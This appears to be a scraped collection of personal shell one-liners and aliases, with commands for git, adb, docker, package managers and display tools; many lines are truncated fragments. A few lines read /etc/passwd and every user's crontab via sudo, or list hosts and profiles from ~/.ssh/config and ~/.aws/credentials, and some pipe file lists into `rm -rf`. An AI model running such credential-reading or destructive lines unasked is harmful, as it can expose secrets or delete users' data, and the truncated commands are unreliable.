cat /etc/passwd | sed 's/^\([^:]*\):.*$/sudo crontab -u \1 -l 2>\&1/' | sh | grep -v 'no crontab for'
cat /etc/passwd | grep /bin/bash | grep -P ^[[:alnum:]]+ | cut -d: -f1
cat /etc/oratab | grep :/ | grep -v agent |cut -d
cat /etc/hosts | grep -v ^# | grep -i ^198 | grep -i $1
cat /etc/lsb-release /etc/os-release /etc/debian_version 2>/dev/null | sort | uniq | xargs -L1
cat /dev/urandom| tr -dc '[:graph:]' | fold -w 64 | head -n 10
cat /dev/urandom | tr -dc a-zA-Z0-9 | fold -w 32 | head -n 1
cat /dev/urandom | tr -dc [:graph:] | fold -w 15 | head -n 1
cat /dev/urandom | tr -dc 'a-zA-Z0-9-\!@#$%^&*()_+~' | fold -w 10 | head -n 1
cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 64 | head -n 1
cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 40 | head -n 1
cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1
cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 18 | head -n 1
cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 16 | head -n 1
cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 8 | head -n 1
cat /dev/urandom | tr -dc 'a-z' | fold -w 32 | head -n 1
cat /dev/urandom | tr -dc '[a-z][A-Z][0-9]-_!@#$%^&*()_+{}|:?=' | fold -w 100
cat /dev/urandom | tr -cd [:graph:] | fold -w $LENGTH | head -n 1
cat /dev/urandom | head -c 18K | hexdump -C | grep
cat /dev/random | hexdump -C | grep --color=auto $(uuidgen | tr -d
cat /dev/random | head -c 200 | sha256sum - | cut -d ' ' -f 1
cat .repo/manifest.xml | grep CyanogenMod | awk '{print $2}' | cut -d'\
cat .nextflow.log | grep -Eo 'INFO.*' | sed 's/INFO\s*//' | sed 's/nextflow.Session -//g'
cat **/src/main/(java|groovy)/**/*.(java|groovy)(.) | wc -l
cat '${HOME}/.ssh/config' | grep 'Host ' | cut -d' ' -f2 | sort
cat $lpLoggingDir/lightningClover.log | bunyan | tail -c -10000; echo 'ANY FATAL?'; cat $lpLoggingDir/lightningClover.log | bunyan -l fatal; echo 'done';
cat $lpLoggingDir/lightningClover.log | bunyan | tail --lines=133; echo 'ANY FATAL?'; cat $lpLoggingDir/lightningClover.log | bunyan -l fatal; echo 'done';
cat $loggingDir/operation.log | bunyan | tail -c -10000; echo 'ANY FATAL?'; cat $loggingDir/operation.log | bunyan -l fatal; echo 'done';
cat $loggingDir/operation.log | bunyan | tail --lines=133; echo 'ANY FATAL?'; cat $loggingDir/operation.log | bunyan -l fatal; echo 'done';
cat $clLoggingDir/lightningClover.log | bunyan | tail -c -10000; echo 'ANY FATAL?'; cat $clLoggingDir/lightningClover.log | bunyan -l fatal; echo 'done';
cat $clLoggingDir/lightningClover.log | bunyan | tail --lines=133; echo 'ANY FATAL?'; cat $clLoggingDir/lightningClover.log | bunyan -l fatal; echo 'done';
cat $STARTUP_CONF | grep prefix | cut -d'x' -f2 | xargs echo -n
cat $SCRATCH_PATH | fzf --tac --ansi | tee >(tr -d '\n\r' | pbcopy)
calvin=$(ls -d $(ls -d $HOME/Pictures/CalvinHobbes/*|shuf -n 1)/* | shuf -n 1| tee >(feh -FZ -f -))
cal | grep --color=auto -E '( |^)$(date +)|$'
cal -y `date | rev | cut -c1-4 | rev`
cabal list --simple-output --installed | gawk '{print $1}' | uniq | xargs -I {} cabal install {} --reinstall
cabal list --installed | egrep -iv '(synopsis|homepage|license)'
bundle exec rspec $(git diff --diff-filter=ACMRTUXB --name-only master -- spec test | egrep --color=never '_(spec|test).rb' | sed 's/src\///')
builtin cd -- $(command gits -list-repo-full | command cho || command pwd)
brew tap | xargs -L 1 echo brew tap > $configsLocaion/Brew List/Brew List.command && brew list | xargs -L 1 echo brew install >> $configsLocaion/Brew List/Brew List.command && brew cask list | xargs -L 1 echo brew cask install >> $configsLocaion/Brew List/Brew List.command
brew services list | ag stopped | awk 'NR>0{ print $1 }' | while read in; do brew services start $in; done
brew services list | ag running | awk 'NR>0{ print $1 }' | while read in; do brew services stop $in; done
brew list | cat ~/.brew_formulae - | sort | uniq > ~/.brew_formulae && brew install `cat ~/.brew_formulae`
brew doctor \$(brew doctor --list-checks | grep -vE 'check_for_stray_(dylibs|static_libs|headers)')
branch=\$(git branch | cut -f2 -d' ' | awk 'NF > 0'); for remote in \$(git remote | grep -v upstream); do git push \$remote \$branch --tags; done
branch -vv | grep 'origin/.*: gone]' | awk '{print $1}' | xargs git branch -df
br -a | tr -d \* | sed '/->/d' | xargs git grep
bqueues -w -u akhil.kedia | head -n 1; bqueues -w -u akhil.kedia | grep _gpu | grep ^s
boinccmd --get_state|grep 'fraction done'|sed 's/^.*: //'|awk '{printf(\
bleachbit -l | egrep 'cache|log' | xargs bleachbit -c
bjobs| grep RUN|wc -l;bjobs|wc -l;
bjobs | grep RUN | wc -l | awk
bind -p | grep -v '^#\|self-insert\|^$'
bex rake parallel:features\['admin|customer|shared|dealer'\]
bex cucumber features/quote_wizard && bex rake parallel:features\['admin|customer|shared|dealer'\]
base64 <(cat /dev/urandom | head -c 16) | tr -d '=' | tr -d '/'
az network public-ip list -o json | jq '.[] | select(.name | contains(\
aws route53 list-hosted-zones | jq '.HostedZones[].Id' | xargs -n1 -P0 aws route53 list-resource-record-sets --hosted-zone-id --output text | grep
aws iam list-virtual-mfa-devices | grep UserName | sort | cut -f 2 -d:
aws --profile awsbillingmaster organizations list-accounts | jq --raw-output '.[] |.[] | select(.Status == \
awk2 | perl -p -e 's!(^([^/]*/?){6}).*!\$1!' | sort | uniq
awk2 | perl -p -e 's!(^([^/]*/?){5}).*!\$1!' | sort | uniq
awk2 | perl -p -e 's!(^([^/]*/?){4}).*!\$1!' | sort | uniq
awk2 | perl -p -e 's!(^([^/]*/?){3}).*!\$1!' | sort | uniq
awk2 | perl -p -e 's!(^([^/]*/?){2}).*!\$1!' | sort | uniq
awk2 | perl -p -e 's!(^([^/]*/?){1}).*!\$1!' | sort | uniq
awk -v var1=$(cleostestnet get table eosio eosio rammarket | jq '.rows[].base.balance' | cut -d ' ' -f 1 | cut -d '
awk '{print $1}' ~/.bash_history | sort | uniq -c | sort -n
awk '\$1 ~ /^#/ || \$7 ~ /^(PASS|\.)$/'
awk '\$1 ~ /^#/ || \$7 !~ /^(PASS|\.)$/'
aspell -a | cut -d ' ' -f 2 | grep -v '*' | grep -v '^$'
arp -n | egrep -v 'incomplete|address' | sort -g
aptitude search '~i !~M !(~prequired|~pimportant|~pstandard)' | less
apt-get upgrade --dry-run | grep -i security || echo NO_SECURITY_UPDATES_REQUIRED
apt-get purge --auto-remove -y \$(dpkg -l |grep '^rc' |awk '{print \$2}' |tr '[:space:]' ' ')
apt-cache policy | grep http | awk '{print $2 $3}' | sort -u
apt update && apt upgrade --dry-run | grep Inst | sort | fzf && apt upgrade
apropos . | shuf -n 1 | awk '{print $1}'| xargs man
apachectl -S | grep 'port 80\|alias\|default server'
android list avds | grep -oe 'Name: [a-zA-Z0-9_]*' | sed -e 's/Name: //' | peco
amanogawa -f '%f%t%d' | column -t -s ' ' | peco | awk '{print \$1}'
aliyun ecs DescribeRegions | jq -r '.Regions.Region | .[] | .RegionId'
alias | grep git | sort | grep
alias | grep -i rails | sort -R | grep
alias | grep -i git | sort -R | grep
alias | egrep '=.*git' | grep -v '^galias' | sort
alias | cut -d= -f 1 | cut -d' ' -f2 | more
ag TODO | tr -d '\t' | sed -e 's/\/\///' | grep --color TODO
ag -G '\.(bb|bbappend|inc|conf)$'
ag 'TODO|FIXME|XXX|HACK'
adbp shell pm list package | sed -e s/package:// | peco | xargs adbp uninstall
adbp shell pm list package | sed -e s/package:// | peco | xargs adb-peco uninstall
adbp shell pm list package | sed -e s/package:// | peco | xargs -I{} adbp backup -apk -shered -f {}_`date +'%Y%m%d_%H%M%S'`.bk {}
adb shell ps | grep com.truckerpath.truckloads | cut -d' ' -f4| xargs adb shell kill -9
adb shell pm list packages -f| grep -i youi | sed 's/.*=//g' | xargs -t -I {} adb shell pm uninstall {}
adb shell pm list packages -f| grep -i youi | sed 's/.*=//g' | xargs -t -I {} adb shell pm clear {}
adb shell pm list package | sed -e s/package:// | peco | xargs adb uninstall
adb shell pm list package | sed -e s/package:// | fzf | xargs adb uninstall
adb shell pm list package -f | rev | cut -d= -f1 | rev
adb shell pm list package -f -3 | rev | cut -d= -f1 | rev
adb shell ip -f inet addr show wlan0|sed -n '2{p;q}'|tr -s ' '|awk -F'[/ ]' '{print \$3}'
adb shell ip -f inet addr show rmnet0|sed -n '2{p;q}'|tr -s ' '|awk -F'[/ ]' '{print \$3}'
adb shell ifconfig | grep 'inet addr' | cut -d: -f2 | awk '{print $1}'
adb shell dumpsys activity activities | grep mFocusedActivity | cut -d ' ' -f 6 | grep -o '[^.]*$'
adb shell am broadcast -a com.android.systemui.demo -e command clock -e hhmm 1200 | adb shell am broadcast -a com.android.systemui.demo -e command network -e mobile show -e level 4 -e datatype false | adb shell am broadcast -a com.android.systemui.demo -e command notifications -e visible false | adb shell am broadcast -a com.android.systemui.demo -e command battery -e plugged false -e level 100
adb logcat | grep `adb shell ps | command grep music | cut -c10-15`
adb logcat -c | adb logcat -v time | grep -v D/SNFCCCS 2>&1 | tee debug.log
adb devices | tail -n +2 | cut -sf 1 | xargs -I X adb -s X uninstall ru.auto.ara.debug
adb devices | tail -n +2 | cut -sf 1 | xargs -I X adb -s X uninstall ru.auto.ara
adb devices | tail -n +2 | cut -sf 1 | xargs -I X adb -s X uninstall $1
adb devices | tail -n +2 | cut -sf 1 | xargs -I X adb -s X shell pm clear $1
adb devices | tail -n +2 | cut -sf 1 | xargs -I X adb -s X shell am start $1
adb devices | tail -n +2 | cut -sf 1 | xargs -I X adb -s X install -r $1
adb devices | grep emulator | cut -f1 | while read line; do adb -s $line emu kill; done
adb devices | grep -v ^''$ | grep -v ^'List of devices attached' | wc -l
acpi -b | sort -r | xargs | sed
ack -n --nogroup '(TODO|FIX(ME)?|NOTE|HACK)'
ack 'TODO|FIXME|XXX|HACK' --ignore-dir=tmp --ignore-dir=log err.txt generated.file succ.txt
ack 'TODO|FIXME|XXX|HACK' --ignore-dir=tmp --ignore-dir=log
ack 'TODO|FIXME|XXX|HACK'
abduco -a \$(abduco | tail -n +2 | cut -d ' ' -d $'\t' -f 3 | fzf)
`ps aux | grep fcitx | awk 'NR==1 {print $2}' | xargs kill`
`history | tail -n1 | cut -f2 | tee /dev/stderr`
`gcloud compute instances list | tail -n +2 | peco | awk
`find o |grep esaserver/cmd |tail -1 |xargs more`
`docker ps -a | tail -n +2 | peco | awk
`docker images | tail -n +2 | peco | awk
\ps auxww | grep procServ | grep -v $USER | grep -v caRepeater
\lspci -nnvs 0:0.0 | egrep '^00:|Kernel|Subsystem'
\ls /usr/bin | xargs whatis | grep -v nothing | less
\ls -a | grep '^\.' | grep -v '^\.$' | grep -v '^\.\.$'
\ls -R | grep ':$' | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/ /' -e 's/-/|/'
\`svn st | egrep '^(M|A)' | awk '{print \$2}'\`
\$(ps -axo 'pid args' | awk 'NR!=1' | fzf | awk '{print \$1}')
\$(docker ps | geti -1 | tails | fzf)
[ -d ~/Desktop/ram ] || mkdir ~/Desktop/ram && sudo mount -t tmpfs none ~/Desktop/ram && df | grep none
VBoxManage list runningvms | grep -qi $name && echo '[+] Running' || echo '[-] Not running';
VBoxManage list runningvms -l | grep 'Host path\|guest port = 80' | sed \
Svn | grep nfs | awk '{print $2}' | xargs rm -f
SESSION_NAME=`echo $PWD:t|sed s/\\\./-/g` ;tmux attach -t $SESSION_NAME || tmux new -s $SESSION_NAME
RDEDUP_DIR=/data/backup rdedup load $(RDEDUP_DIR=/data/backup rdedup list | sort | tail -1) | rdup-up
PROFILE_STARTUP=true zsh --login -c 'exit' && zsh_profile_decoder.py `ls -t ~/tmp/startlog* | head -n1` | sort -k2n | less
PASSWORD_STORE_DIR=~/.password-store-old password_entries | grep -i / | percol | sed 's/.*/\
MATLAB_maci64 | column -t | tr ' ' '\n' | sed -n 3p)"
LC_ALL=C svn status | grep -P -o ' C (.*)$' | awk '{print $2}' | xargs -0 -i echo {}
LC_ALL=C svn status | grep 'M X' | awk -F' ' '{print $3}' | xargs svn revert
LC_ALL=C pacman -Qi | sed -n '/^Name[^:]*: \(.*\)/{s//\1 /;x};/^Installed[^:]*: \(.*\)/{s//\1/;H;x;s/\n//;p}' | sort -nk2 | column -t
LANG=C LC_ALL=C sed -i '' s'|/Registry (Adobe) /Ordering (Japan1) /Supplement [0-9]|/Registry(Adobe) /Ordering(Identity) /Supplement 0|g'
INFO echo '### Available Git Functions (.gitrc) ###'; CMDINFO echo -n; cat ~/bash/.gitrc | grep function; echo -n; INFO echo '### Git aliases (.gitrc) ###:'; CMDINFO echo -n; cat ~/bash/.gitrc | grep alias; echo -n; INFO echo '### Git config aliases (.gitconfig) ###:'; CMDINFO git config --list | grep alias; echo -n; NORMAL
HOME=/home/`who | cut -d ' ' -f 1 | uniq | sed '/root/d'` && sudo vim -u $HOME/.vimrc
GIST=`gist -l | grep \`current_branch\` | cut -d ' ' -f 1 | cut -d '/' -f 4`; gist -u $GIST
FIND=(find . -type f -name '*.gz') && \${FIND[@]} -print0 | pv -0lps \$(\${FIND[@]} | wc -l) | xargs -0 -n1 -P36 -I{}
ALL_TEST_COUNT=$(cat $0 | grep ^fail_unless_ | wc | awk '{print $1}')
< /dev/urandom tr -dc A-Za-z0-9_ | head -c10 | xargs | cat
< /dev/urandom tr -dc 0-9 | head -c16 | xargs | cat
:> ~/.msf4/logs/framework.log && tail -fn0 ~/.msf4/logs/framework.log | egrep --color -i 'call stack|exception|$'
976760,226044,delb,git co master && git pull origin master && git branch --merged| egrep -v """"(^\*|master)"""" | xargs git branch -d"""
4702762,889273,docker-restart,docker ps -q | xargs docker kill 2>/dev/null || true &&\"
4297566,693151,top10,print -l ${(o)history%% *} | uniq -c | sort -nr | head -n 10"""
4169909,663935,top10,print -l ${(o)history%% *} | uniq -c | sort -nr | head -n 10"""
3643175,583702,gdel,git status | grep deleted | awk '{print \$3}' | xargs git rm"""
364284,112127,random-mpv,find . -type f | shuf | head -n 1 | xargs mpv"""
3575447,576476,grm,git status | grep deleted | awk '{print \$3}' | xargs git rm"""
3572825,576123,ips,ifconfig -a | grep -o 'inet6\? \(\([0-9]\+\.[0-9]\+\.[0-9]\+\.[0-9]\+\)\|[a-fA-F0-9:]\+\)' | sed -e 's/inet6* //'"""
3425499,539081,lstree,ls -R | grep ':$' | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/ /' -e 's/-/|/'"""
3285799,525246,free,top -s 0 -l 1 -pid 0 -stats pid | grep '^PhysMem: ' | cut -d : -f 2- | tr '"
3207915,515141,ips,ifconfig -a | grep -o 'inet6\? \(addr:\)\?\s\?\(\(\([0-9]\+\.\)\{3\}[0-9]\+\)\|[a-fA-F0-9:]\+\)' | awk '{ sub(/inet6? (addr:)? ?/"
3194213,514128,localip,sudo ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'"""
3023947,496946,kud,kubectl get deploy -o json | jq -r '.items | .[] | {name: .metadata.name"
2>&1 | tee /dev/tty | tail -3| growlnotify -w -s -n ruby-growl --image \
2>&1 | tee /dev/tty | grep -oE 'https://.*' | xargs open
2886037,482671,startover,git status | grep """"modified"""" | awk """"{print \$2}"""" | xargs -I{} git checkout -- {}"""
1533723,305656,listusers,cat /etc/passwd |grep /bin/bash |grep [5-9][0-9][0-9] |cut -d: -f1"""
1405625,285437,dmf_aliases_rdp,echo """"""""; echo """"*** LIST OF ALL DMF RDP ALISES: ***""""; echo """"""""; echo """"$(alias | grep -i rdp | egrep -i """"_dmf|dmf_"""") """""""
/usr/ucb/ps -axlgww | egrep 'PPID|\!*' | grep -v grep
/usr/sbin/apachectl fullstatus | grep -P '\s\s(GET|POST) ' | sort
/usr/local/bin/quote | /usr/games/cowsay -f $(ls /usr/share/cowsay/cows/ |shuf -n 1) | lolcat
/usr/local/bin/jq '[.indices|path(.[]|select(.primaries.docs.count == 0))|.[0]]'
/usr/local/bin/docker ps -a | grep Exit | cut -d ' ' -f 1 | xargs /usr/local/bin/docker rm -fv
/usr/bin/ls -a | grep '^\.' | grep --invert-match '\.DS_Store\|\.$'
/usr/bin/env ls -1A | tr '\n' '\0' | xargs -0 du -sk | sort -n
/usr/bin/du -sk err.txt generated.file succ.txt | sort -nr | cut -f2 | awk -F
/sbin/ifconfig | grep -o 'inet addr:[^ ]*' | sed 's/inet addr://' | grep -v '127.0.0.1'
/sbin/ifconfig | grep 'inet addr' | awk -F: '{print $2}' | awk '{print $1}'
/sbin/ifconfig | grep 'inet ' | sed 's/^[^:]*://' | sed 's/ .*:/ \/ /'
/sbin/ifconfig | grep 'inet ' | grep -v 127.0.0.1 | sed 's/.*addr:\([0-9\.]*\).*/\1/'
/sbin/ifconfig | grep 'inet ' | grep -v 127.0.0.1 | awk '{ print \$2 }'
/sbin/ifconfig | grep 'inet ' | awk '{print \$2}' | grep -v '127.0.0.1'
/sbin/ifconfig en0 | grep inet | grep -v inet6 | cut -d ' ' -f2
/sbin/ifconfig -a | awk '/(cast)/ { print $2 }' | cut -d':' -f2 | head -1
/opt/local/bin/ctags -e \`find (app|spec|lib|config)/**/*.rb\`
/bin/ls -d /var/log/nginx/access.log /var/log/nginx/error.log /var/log/apache2/* storage/logs/* app/storage/logs/* storage/laravel.log | grep -v 'gz$' | grep -v '1$' | xargs tail -f
/bin/ls -ahlt *(.mw-1) || ls -ahlt | head
/bin/ls -A | /bin/head -n $(($RANDOM % $(/bin/ls -A | /bin/wc -l))) | /bin/tail -1
/bin/grep -e '^\[=*\]' -e '^.*\[.*\(OK\|PASSED\|RUN\|ERROR\).*\]'
/bin/cat /var/log/apt/history.log | grep -Po '(?<=apt-get install ).+' | tr ' ' '\n' | sort
/Library/Frameworks/Python.framework/Versions/3.5/bin/pip3 install --upgrade pip && /Library/Frameworks/Python.framework/Versions/3.5/bin/pip3 freeze --local | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 /Library/Frameworks/Python.framework/Versions/3.5/bin/pip3 install -U
../../../tools/genmake2 -mods=../code -of=../../../tools/build_options/linux_amd64_gfortran | tail -10; make depend | tail -10; make | tail -10
../../../tools/genmake2 -mods=../code -mpi -of=../../../tools/build_options/linux_amd64_gfortran | tail -10; make depend | tail -10; make | tail -10
*.(pdf|txt|tex|rtf)
*.(mp3|ogg|flac|m4a)
***/*.([chly]|[ch]pp|[ch]xx|C)
(tmux ls | grep -vq attached && tmux at) || tmux
(sync &) ; pwd | grep -i mnt\/zip && cd /current/bin && pwd ; unfindzip || unfindzip
(setxkbmap -query | grep -q 'layout:\s\+us') && setxkbmap de || setxkbmap us
(scrls |& grep sysmon) || screen -S sysmon -T screen -c /root/.screen/system-overview.screenrc
(pip freeze 2>/dev/null | grep pytest-xdist >/dev/null) || pip install pytest-xdist; py.test -n2 -vs
(pbpaste | multimarkdown | textutil -stdin -stdout -convert rtf -format html | pbcopy)
(pacman -Qdtq || true) | xargs -r sudo pacman -Rns --noconfirm
(lsof -c scheduler -t | xargs kill) && (lsof -c workerserver -t | xargs kill) && (lsof -c apiserver -t | xargs kill)
(ipconfig getifaddr en1 || ipconfig getifaddr en0) | pbcopy && echo \
(ifconfig || ip addr) | grep 'inet '
(g.root && (git ls-files -md | xargs git reset HEAD) && (git ls-files -md | xargs git checkout --) && (git ls-files -o --exclude-standard | xargs rm -rf))
(fzf -m --preview='ccat {}' || exit 0) | xargs rm -rf
(dcg status portainer | grep -q running || dcg start portainer) && open http://localhost:9000
(comm -23 <(pacman -Qqen|sort) <(pacman -Qqg base base-devel|sort)) | sort -n
(cd \$(git rev-parse --show-toplevel) && git diff master --name-only --diff-filter=ACMRTUXB | grep '\.rb$' | tr '\n' ' ' | xargs bundle exec rubocop)
(cd ./o && less +F `find .|grep $1|xargs ls -arth|tail -1`)
(amixer get Master | grep off > /dev/null && amixer -q set Master unmute) || amixer -q set Master mute
(alias | cut -f1 -d= ; hash -f; hash -v | cut -f 1 -d= ; typeset +f) | sort
() { print -l ${(ok)functions} | grep -E ${1-.} | bat | fzf }
() { alias | grep -E ${1-.} | bat | fzf }
( rtxmlrpc system.listMethods ; rtxmlrpc system.has.private_methods | sed -re 's/$/ \[prv]/' ) | sort | egrep
( ps -ea|grep xwared || /opt/xware-desktop/xwared & ) && /opt/xware-desktop/frontend/launcher.py
( files=\$(grep -rl '\<\(TODO\|FIXME\|XXX\|HACK\)\>' $SOURCE_EXTGLOB 2>/dev/null); if test -n \
'kill -9 `ps aux| grep node | grep server | awk '{print $2}'`'
&& pip freeze --local --quiet | grep -v \'^\-e\' | cut -d = -f 1 | xargs -n1 sudo -H pip install --user -U"
$adb shell mount | awk '/emulated|sdcard0/{next}/(Removable|storage)\//{if(\$2==\
$EDITOR $(php --ini | grep Loaded | grep php.ini | awk '{print $4}')
$(history | tail -n 2 | cut -c 8- | sed -e '$ d')
$(history 1 | sort -ur | cut -c8- | pick)
$(docker ps -a | tail -n +2 | peco | awk
$(docker images | tail -n +2 | peco | awk
$(docker images | tail -n +2 | peco --layout bottom-up | awk
$(docker image ls | awk -F ' ' '{print $3}' | awk 'NR>1') | while read line; do echo $line; docker rmi $line; done
$(cat CMakeCache.txt | ack CMAKE_COMMAND | cut -d= -f2 | xargs dirname)/
$'xinput list | grep ${builtinKeyboard} | awk \'{print $7}\' | cut -c 4-5'
$'tmux a -t $(tmux ls | awk \'{print $1}\' | sed \'s/.$//\' | fzf)'
$'kubectl describe service | grep Endpoint | grep -v none | awk \'{ print $2 }\''
$'git ls-files | awk -F / \'{print $1}\' | uniq | xargs ls -d --color=auto'
$'git ls-files --others --exclude-standard | awk -F / \'{print $1}\' | uniq | xargs ls -d --color=auto'
$'git log --oneline | fzf | cut -f1 -d\' \' | xargs git log -1 -p'
$'cd $(ls -lt | grep \'^d\' | head -1 | awk \'{print $NF}\')'
$'awk \'/^\[/ {print $NF}\' ~/.aws/config ~/.aws/credentials | tr -d \'[]\' | sort | uniq'
# "" | highlight `cat .git/HEAD | sed ""s/^.* //g""` | less -FRSX"
"~jacquot/bin/node_list.py | egrep ""shi|lhi|lii"""
"|export ${NAME}=|(function )?${NAME}( )?\()|function $NAME"" ""$DESKPATH"" \"
"|awk ""{print length,\$0}""|sort -ns|cut -d"" "" -f2-"
"| sort | uniq -c | sort -k1,1n "
"| rev | cut -d "" "" -f 1 | rev"
"| perl -pe ""chomp if eof"" | xclip -i -sel p -f | xclip -i -sel c"
"| nobuf cut -d""|"" -f4- | nobuf grep -E -v ""^$"""
"| jq -c "".hits.hits[] | {score: ._score, fname: ._source.first_name, lname: ._source.last_name}"" | less"
"| head -$(($(tput lines)-5)) | expand | cut -c-""$(tput cols)"""
"| egrep -o ""\.[a-z]+$"" | sort | uniq"
"| cut -d"":"" -f1 | sort | uniq"
"{ wg genkey 1>&2 | wg pubkey | sed ""s:^:PublicKey = :"" 1>&3 } 2>&1 3>&2| sed ""s:^:PrivateKey = :"" 3>&-"
"zgrep 'install ' /var/log/dpkg.log | sort | cut -f1,2,4 -d' '|less"
"zeus rspec `find ./spec -name ""*spec.rb"" -type f -exec stat -f ""%m %N"" {} \; | sort -n | tail -1 | cut -f2- -d"" ""`"
"xset q | grep 'Caps' | tr -s ' ' | cut -d ' ' -f 3,5,7,9,11,13"
"xset q | grep ""^ *DPMS is"" | awk ""{print \$3}"" | tr ""[:upper:]"" ""[:lower:]"""
"xrandr | grep -q ""HDMI1 connected"" && xrandr --output eDP1 --off --output HDMI1 --auto || echo ""HDMI1 is not connected"""
"xrandr | grep "" connected primary"" | cut -d"" "" -f 4 | cut -d""+"" -f1"
"xrandr -q | grep "" connected"" | cut -d"" "" -f 1 | xargs -I display xrandr --output display --brightness"
"xrandr -q | grep "" connected"" | awk ""{print $""${1:-1}""}"" ORS="" "" | pbcopy"
"xprop | grep --color=none ""WM_WINDOW_ROLE\|WM_CLASS"" | xmessage -file - -center"
"xprop | grep --color=none ""WM_CLASS\|^WM_NAME"" | xmessage -file -"
"xprop | grep ""^WM_WINDOW_ROLE\|^WM_CLASS\|^WM_NAME"""
"xmms2 remove $(xmms2 list | grep ""\->""| grep -o ""\[.*/"" | grep -wo ""[0-9]*"") && xmms2 next"
"xmms2 add ""`xmms2 info | grep file:// | cut -d: -f2 | xargs -0 dirname`"""
"xinput set-prop $(xinput list | grep -i touchpad | cut -f 2 | cut -d = -f 2) ""Device Enabled"" 1"
"xinput set-prop $(xinput list | grep -i touchpad | cut -f 2 | cut -d = -f 2) ""Device Enabled"" 0"
"xinput enable $(xinput list | grep -Eio ""touchpad.*id=[0-9]+"" | head -1 | cut -d= -f2)"
"xinput disable $(xinput list | grep -Eio ""touchpad.*id=[0-9]+"" | head -1 | cut -d= -f2)"
"xcodebuild -list | grep -A8 ""Build Configuration"" | sed -e ""1d"" | xargs -n1 xcodebuild clean -alltargets -configuration"
"xauth list | grep `echo $DISPLAY | sed -e s/\.0\$// -e s@localhost@$HOSTNAME/unix@` | sed -e ""s/^/xauth add /"""
"who|cut -f 1 -d "" ""|sort|uniq"
"whois $(pubip) 2>/dev/null | efilters -rl ""^country: *"" | estrips -r ""^country: *"" | head -1"
"while true; do sleep $(expr $RANDOM % 2); echo -e ""\033[1;33m $(rg --files |gsort -R |head -n1)\033[0m""; sleep $(expr $RANDOM % 2); echo -e ""\033[0;37m$(date | shasum -) \033[0;32m done""; echo -e ""\033[0m""; done"
"while true ; do ps -eo pid,stat| grep -oP '.*(?= D$)'| xargs -n1 -I@ ls -al /proc/@/fd 2>/dev/null| grep '/nas/content/' ; sleep .5 ; done"
"while read line; do echo $line | sed -r ""s/^.*\|.*(\{.*)$/\1/"" | bunyan; done;"
"while read line; do count=1; out=$(echo ""$line""|tr ""|"" ""\n""); echo $out|while IFS= read -r i; do echo ""$count $i""; count=$((count+1)); done; echo ""----------------------------------------------------------------------------------------------------""; done"
"whatis $(find /usr/share/man/man{1,4,5,6,7,8}/ -printf ""%f\n"" | shuf -n 5 | cut -d. -f1) | head -n 5"
"whatis $(find /usr/share/man/man1/ /usr/share/man/man3/ /usr/share/man/man5/ /usr/share/man/man7/ /usr/share/man/man8/ -printf ""%f\n"" | shuf -n 5 | cut -d. -f1) | head -n 5"
"wget randomfunfacts.com -O - 2>/dev/null | tee lastfact | grep \<strong\> | sed ""s;^.*<i>\(.*\)</i>.*$;\1;"""
"wget -O /tmp/jenkins.out http://vm-001-lenny-jenkins-main:8080/job/Run%20datacash-tidsetup-testing%20on%20vm-007-lenny-damn-client/lastBuild/consoleText; echo ""100 err.txt generated.file succ.txt `grep -o ""Running"" nohup.out | wc -w` / `grep -o ""Running"" /tmp/jenkins.out | wc -w ` "" | bc; echo `grep ""Total time:"" /tmp/jenkins.out`;"
"wget -O /tmp/jenkins.out http://vm-001-lenny-jenkins-main:8080/job/Run%20datacash-reporting-testing%20on%20vm-006-lenny-reporting-client/lastBuild/consoleText; echo ""100 err.txt generated.file succ.txt `grep -o ""Running"" nohup.out | wc -w` / `grep -o ""Running"" /tmp/jenkins.out | wc -w ` "" | bc; echo `grep ""Total time:"" /tmp/jenkins.out`;"
"wc -l `find . -regex "".*\.\(java\|html\|js\|css\)""`"
"watch -n1 ""ps -e -o \""pid,ppid,command\"" 2>/dev/null | grep \""[p]ostgres\|[e]stacion\|[c]ontenido\"""""
"watch ""qstat -n | grep jburkhar | tr -s [:blank:] | sort -r -k10"""
"w -hs | cut -d "" "" -f1 | sort | uniq"
"volstatus | grep -i brick | grep N | cut -d"" "" -f2"
"vim `git status -s | grep ""[^/]$"" | sed s/^...// | xargs`"
"vim . `find . -type f | grep -vE ""(\.git|\.vs|node_modules)/""`"
"vim -t ""$(cut -f1 tags | tail +7 | uniq | fzf)"""
"vim -p `git status | grep ""modified:\|new file:"" | awk -F"": "" "
"vim -p `git status --porcelain | grep "" M\|A "" | cut -d"" "" -f3`"
"vim -p -c ""tabdo VCSVimDiff HEAD"" `svn st | grep ""^M"" | cut -c 8- | xargs`"
"vim -p -c ""tabdo VCSVimDiff HEAD"" `svn st -u | grep ""*"" | cut -c 22- | xargs`"
"vim -p '+/[<=>]\{7,\}' \`git status | grep both | cut -f2 -d: | xargs\`"
"vim -c ""set paste | vnew | windo diffthis | wincmd h"""
"vim -c "":TOhtml $1| w |q |q"""
"vim $(find $HOME/.vim/vimrc/ -type f -name ""*.vim"" | sed ""\$a""$HOME""/.vimrc"" | sort | fzf)"
"vim ""$(find . ! \( -path ""./.*"" -o -path ""*/.*"" \) -type f -printf ""%T@ %p\n"" | sort -n | tail -1 | cut -f2- -d"" "" )"""
"vi `ls | grep ""log.*txt"" | sort -r | head -1`"
"vi ${ODIAG}/diag/`[[ ${OSID} == *""+ASM""* ]] && echo ""asm"" || echo ""rdbms""`/`echo ${OSID%[0-3]} |tr "
"vi ${!ODIAG}/diag/`[[ ${!OSID} == *""+ASM""* ]] && echo ""asm"" || echo ""rdbms""`/`echo ${!OSID%[0-9]} |tr "
"vagrant global-status | sed '/------/,/^ \$/!d;/^ \$/d;2d' | awk '{print \$1}' | xargs vagrant destroy -f"
"vagrant global-status | grep running | awk ""{print $5}"" | xargs -I % bash -c ""cd % && vagrant halt"""
"v -p $(git status -s|grep ""^ *M""|cut -d"" "" -f3-|xargs) "
"uuidgen | tr ""[:upper:]"" ""[:lower:]"" | tr -d ""\n"" | pbcopy"
